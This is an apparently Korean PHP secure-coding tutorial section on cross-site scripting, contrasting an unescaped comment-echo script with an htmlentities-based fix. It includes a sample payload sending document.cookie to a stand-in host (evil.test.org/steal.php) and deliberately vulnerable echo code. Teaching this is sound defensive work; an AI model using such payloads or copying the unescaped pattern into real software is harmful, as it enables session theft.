# 7. 크로스 사이트 스크립팅
 크로스 사이트 스크립팅(XSS, Cross-Site Scripting)은 가장 유명한 공격 유형으로 모든 플랫폼에서 대부분의 응용프로그램들을 공격하고 있습니다. 모든 입력폼이 공격 대상이되고, 크로스 사이트 스크립팅의 취약점을 보완하기 위해 필터링과 이스케이프는 필수적인 요소입니다.

 EX) 페이지에 코멘트를 입력할 수 있는 폼
 ```
 <form action="comment.php" method="POST" />
    <p>Name: <input type="text" name="name" /><br />
    Comment: <textarea name="comment" rows="10" cols="60"></textarea><br />
    <input type="submit" value="Add Comment" /></p>
</form>
 ```
  form에서 받은 데이터를 다른 사용자에게 보여주는 코드는 아래와 같습니다.
```
<?php
    echo "<p>$name writes:<br />";
    echo "<blockquote>$comment</blockquote>";
?>
```
 위 코드는 $name과 $comment 변수 값을 매우 신뢰하고 있습니다. 하지만 스크립트 코드가 삽입된다면
```
<script>
    document.location = 'http://evil.test.org/steal.php?cookies=' + document.cookie
</script>
```
 위 코드는 공격자가 작성한 자바스크립트를 추가할 수 있게 허용한 것과 같습니다. 자신의 쿠기 값이 evil.test.org의 steal.php GET 파라미터로 전송되고 모든 내용을 읽을 수 있게 됩니다. 그래서 이를 말기 위해 입력 필터링하고, 출력을 이스케이프는 필수적으로 이루어져야 합니다. 클라이언트에 데이터를 보낼 때 이스케이프하기 위해 사용하는 대표적인 함수는 htmlentities() 입니다. 모든 특수 문자를 HTML 엔티티(entity)로 변환합니다. 
 *HTML 엔티티는 &약어;나 &#숫자;의 형태로 표현하는 것을 의미하며 <은 &lt;로 >은 &gt; 로 표현합니다. 여기서 htmlentities()는 iso-8859-1 인코딩을 기준으로 변환하기 때문에 일부 한글은 &#숫자;의 형태로 표현됩니다. PHP 4.3 이 후는 htmleneities의 세번째 인자로 인코딩을 지정할 수 있지만 한글 인코딩은 지원하지 않았습니다. 그래서 EUC-KR에서 온전하게 한글을 표현하려면 htmlspecialchars()를 사용해야 합니다. 하지만 htmlspecialchars()는 철벽 방어가 불가능합니다. UTF-8 인코딩으로 사이트를 구축하는 경우에는 htmlentities()의 세번째 인자를 UTF-8로 지정해서 사용할 수 있으며, 안전한 사이트를 구축을 할 수 있습니다. 하지만 PHP 4.x 일부 버전에서는 UTF-8에서 htmlentities($value, ENT_QUOTES, UTF-8)과 같은 형태에서 한글이 깨지는 버그를 가진 것도 있습니다.
 
### 좋은 예)
```
<?php
    $clean = array();
    $html = array();

    $html['name'] = htmlentities($clean['name'], ENT_QUOTES, 'UTF-8');
    $html['comment'] = htmlentities($clean['comment'], ENT_QUOTES, 'UTF-8');

    echo "<p>{ $html['name']} writes:<br />";
    echo "<blockquote>{ $html['comment']}</blockquote></p>";
?>
```
